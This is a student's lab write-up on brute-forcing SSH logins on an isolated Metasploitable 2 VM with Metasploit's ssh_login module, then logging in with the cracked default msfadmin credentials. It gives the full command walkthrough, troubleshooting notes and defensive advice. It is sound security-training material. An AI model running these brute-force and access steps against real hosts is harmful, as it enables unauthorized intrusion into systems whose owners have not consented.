# Lab 4 — Gaining Remote Access via SSH Brute Force

## Objective
Take a target's open SSH port (22), discovered during the Lab 3 reconnaissance, and turn it into **remote access**. This lab uses Metasploit's `ssh_login` auxiliary module to brute-force valid credentials, confirms the cracked login is stored in the workspace, and then uses it to open a real SSH shell on the target — completing the full **recon → exploit → access** chain.

## Lab environment

| Role | Machine | IP |
|---|---|---|
| Attacker | Kali Linux | 192.168.10.8 |
| Target | Metasploitable 2 | 192.168.10.9 |

Both VMs on the same VirtualBox NAT Network (subnet `192.168.10.x`). **All addresses are private lab IPs (RFC 1918).** Metasploitable 2 is intentionally vulnerable and kept isolated — never bridged to a real network.

## Key concepts
- **Brute force:** automatically trying many username/password combinations until one logs in. It can only ever succeed if the correct credential is actually present in the wordlist being used.
- **Auxiliary module:** a Metasploit module for supporting work (scanning, credential-guessing) rather than exploiting a software flaw. `ssh_login` is auxiliary — it's just trying keys in the lock, not breaking the lock.
- **Wordlist:** a text file of candidate usernames or passwords. The quality and relevance of the wordlist is the single biggest factor in whether a brute force succeeds.
- **`RHOSTS` vs `LHOST`:** `RHOSTS` = the **remote** target you're attacking; `LHOST` = your **local** attacking machine.

## Walkthrough (what I ran)

### 1. Reconnect to the database and the Lab 3 workspace
```bash
sudo su
service postgresql start
msfconsole -q
workspace meta2            # the workspace holding our Lab 3 recon
services                   # confirm port 22 (ssh) is open on 192.168.10.9
```

### 2. Find and load the SSH brute-force module
```bash
search type:aux ssh
use auxiliary/scanner/ssh/ssh_login
```
> **Lesson — go by name, not number.** The lab sheet said "use 15"; in my Metasploit it was **18**. Module numbers are just positions in your own search results and change between versions. Always match on the name `scanner/ssh/ssh_login`.

### 3. Configure the attack
```bash
set rhosts 192.168.10.9                  # the target
set user_file /home/kali/users.txt       # usernames to try (custom list — see below)
set pass_file /home/kali/passwords.txt   # passwords to try (custom list)
set user_as_pass true                    # also try each username as its own password
set verbose true                         # show each attempt
set stop_on_success true                 # stop at the first cracked login
run
```

### 4. Collect the cracked credential
```bash
creds                      # shows: msfadmin / msfadmin on 192.168.10.9:22
```

### 5. Use the credential — open a shell on the target
```bash
# Modern Kali disables the old crypto Metasploitable 2 uses, so re-enable it for this connection:
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.10.9
# password: msfadmin
```

### 6. Confirm access and prove it
```bash
whoami        # msfadmin
hostname      # metasploitable
id            # msfadmin is in sudo/admin groups → path to full root
# Proof-of-access marker (harmless):
echo "Compromised via SSH brute force - $(date)" > /tmp/pwned.txt
cat /tmp/pwned.txt
exit          # close the SSH session
```

## Result
- Brute force cracked **`msfadmin : msfadmin`** on `192.168.10.9:22`.
- The credential was stored in the `meta2` workspace (`creds`).
- Logged into Metasploitable 2 over SSH and confirmed with `whoami` / `hostname`.
- Dropped a harmless proof-of-access file on the target — demonstrating full remote access without causing damage, exactly as a professional engagement would.

## Troubleshooting — the real learning
The textbook steps didn't work out of the box. Working through *why* was the most valuable part of this lab, and mirrors real-world pentesting where tools and targets rarely match the tutorial:

1. **The module changed.** Newer `ssh_login` **refuses to run without a password source** (`PASS_FILE`, `PASSWORD`, or a key) — `user_as_pass true` alone is no longer enough. Reading the validation error and adding a `pass_file` fixed it.
2. **The stock wordlist didn't contain the target account.** The scan kept failing because `msfadmin` **wasn't in Kali's default `unix_users.txt`** — I confirmed this with `grep msfadmin /usr/share/wordlists/metasploit/unix_users.txt` (no output = not present). *A brute force can only find what's in the wordlist.* I built small, targeted custom wordlists containing the accounts a box like this actually uses — a better and faster approach than giant generic lists.
3. **Metasploit commands only run inside msfconsole.** Typing `set`/`run` in a regular bash tab gives `command not found` — they're Metasploit commands, not shell commands.
4. **File permissions.** A normal user can't write to `/root` (the admin's home). Writing the wordlists to `/home/kali` (my own home) resolved the `permission denied` error.
5. **Legacy SSH crypto.** The target only offers `ssh-rsa` / `ssh-dss`, which modern OpenSSH disables as weak. I re-enabled them for the connection with `-o HostKeyAlgorithms=+ssh-rsa`. **This is itself a finding:** a server that only accepts deprecated algorithms is a reportable weakness.

## Key takeaways
- The attack chain is real: **open port → cracked credential → remote shell.** Recon (Lab 3) directly enabled this access.
- **A brute force is only as good as its wordlist** — verify your target credential is in the list (`grep`) before waiting on a long run.
- **`user_as_pass`** exploits a shockingly common habit: accounts left with the password equal to the username (`msfadmin:msfadmin`).
- Being able to **read an error and adapt** — a changed module, a missing wordlist entry, a permissions block, deprecated crypto — is the core skill. Tutorials go stale; the troubleshooting doesn't.

## How to defend against this (blue-team view)
- Enforce **strong, unique passwords** and disable default/shared accounts — brute force dies against good passwords.
- Prefer **key-based SSH authentication** and disable password login entirely (`PasswordAuthentication no`).
- **Disable direct root login** (`PermitRootLogin no`).
- Rate-limit and lock out repeated failures with **fail2ban** or equivalent; alert on bursts of failed logins.
- Keep SSH **up to date** so weak host-key/kex algorithms aren't offered.

## Screenshots
_Add terminal screenshots here: the `[+] Success` brute-force line, the `creds` table showing `msfadmin/msfadmin`, and the SSH login showing the `msfadmin@metasploitable:~$` prompt. All IPs are private lab addresses, safe to show._
